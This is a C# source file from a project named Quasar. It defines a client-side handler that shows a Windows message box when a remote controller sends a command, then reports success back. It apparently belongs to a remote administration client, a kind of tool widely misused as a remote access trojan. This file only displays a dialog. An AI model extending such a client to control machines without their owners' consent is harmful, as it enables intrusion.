using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Messages
{
    public class MessageBoxHandler : MessageProcessorBase<object>
    {
        public MessageBoxHandler() : base(false)
        {
        }

        public override bool CanExecute(IMessage message) => message is DoShowMessageBox;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoShowMessageBox msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoShowMessageBox message)
        {
            new Thread(() =>
            {
                MessageBox.Show(message.Text, message.Caption,
                    (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), message.Button),
                    (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), message.Icon),
                    MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
            }).Start();

            client.Send(new SetStatus { Message = "Successfully displayed MessageBox" });
        }

        protected override void Dispose(bool disposing)
        {
            
        }
    }
}
